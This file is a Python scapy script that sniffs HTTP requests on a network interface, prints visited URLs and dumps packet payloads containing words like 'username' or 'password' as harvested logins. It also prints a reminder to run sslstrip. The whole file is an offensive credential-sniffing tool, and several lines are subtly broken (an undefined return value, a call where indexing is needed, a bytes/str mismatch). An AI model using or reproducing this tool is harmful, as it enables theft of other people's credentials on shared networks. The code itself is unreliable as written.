#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface to sniff")
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet(http.HTTPRequest).Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url((packet))
        print("[+] HTTP Request >>" + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] possible username/pass>" + login_info + "\n\n")

print("Do sslstrip")

options = get_arguments()
sniff(options.interface)


